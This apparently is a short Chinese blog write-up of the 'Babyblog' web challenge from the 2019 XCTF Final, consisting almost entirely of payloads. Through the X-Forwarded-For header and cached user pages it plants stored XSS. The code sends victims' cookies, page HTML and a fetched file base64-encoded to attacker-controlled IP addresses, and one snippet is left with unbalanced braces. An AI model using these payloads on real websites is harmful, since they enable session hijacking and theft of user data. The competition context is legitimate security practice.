    <title>2019 XCTF Final 部分题解</title>
    <url>/2019-XCTF-Final/</url>
    <content><![CDATA[<p><strong>Xirshir</strong>先辈<strong>TQL</strong>。</p>
<a id="more"></a>

<h3 id="Babyblog"><a href="#Babyblog" class="headerlink" title="Babyblog"></a>Babyblog</h3><p>发现<strong>xff</strong>可以注入，且<strong>/user.php/xxx</strong>后访问有缓存。</p>
<p>大致思路即为<strong>xff</strong>写入<strong>xss</strong>脚本，访问<strong>/user.php/xxx</strong>生成缓存发送给后台访问。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;this.onerror&#x3D;null;this.src&#x3D;&#39;http:&#x2F;&#x2F;120.77.215.95:2333&#x2F;?&#39;+btoa(document.cookie)&quot;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0;url&#x3D;&#x2F;flag&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    window.location.href &#x3D; &#39;http:&#x2F;&#x2F;120.77.215.95:2333&#x2F;?&#39; + btoa(document.cookie)</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;passport?image&#x3D;%2Fstatic%2Fhead.jpg&amp;island&#x3D;&amp;fruit&#x3D;&amp;name&#x3D;&amp;data&#x3D;amF2YXNjcmlwdDp3aW5kb3cubG9jYXRpb24uaHJlZiA9ICdodHRwOi8vMTIyLjUxLjExMy4xNjQ6MjMzMy8&#x2F;JyArIGJ0b2EoZG9jdW1lbnQuY29va2llKQ&#x3D;&#x3D;%27%3b%0aopen(atob(data))%3b%2F%2F</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;134.175.231.113:8848&#x2F;passport?image&#x3D;%2Fstatic%2Fhead.jpg&amp;island&#x3D;&amp;fruit&#x3D;&amp;name&#x3D;&amp;data&#x3D;amF2YXNjcmlwdDp3aW5kb3cubG9jYXRpb24uaHJlZiA9ICdodHRwOi8vMTIyLjUxLjExMy4xNjQ6MjMzMy8&#x2F;JyArIGJ0b2Eob3BlbmVyLmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MKQ&#x3D;&#x3D;%27%3b%0aopen(atob(data))%3b%2F%2F</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var request &#x3D; new XMLHttpRequest();</span><br><span class="line">request.open(&#39;GET&#39;, &#39;&#x2F;island&#x2F;test_03.png&#39;, true);</span><br><span class="line">request.onload &#x3D; function() &#123;</span><br><span class="line">  if (this.status &gt;&#x3D; 200 &amp;&amp; this.status &lt; 400) &#123;</span><br><span class="line">    var resp &#x3D; this.response;</span><br><span class="line">    window.location.href &#x3D; &#39;http:&#x2F;&#x2F;122.51.113.164:2333&#x2F;?&#39; + btoa(resp)</span><br><span class="line">  &#125; </span><br><span class="line">request.send();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;passport?image&#x3D;%2Fstatic%2Fhead.jpg&amp;island&#x3D;&amp;fruit&#x3D;&amp;name&#x3D;&amp;data&#x3D;&#x3D;%27%3b%0aopen(atob(data))%3b%2F%2F</span><br></pre></td></tr></table></figure>



]]></content>
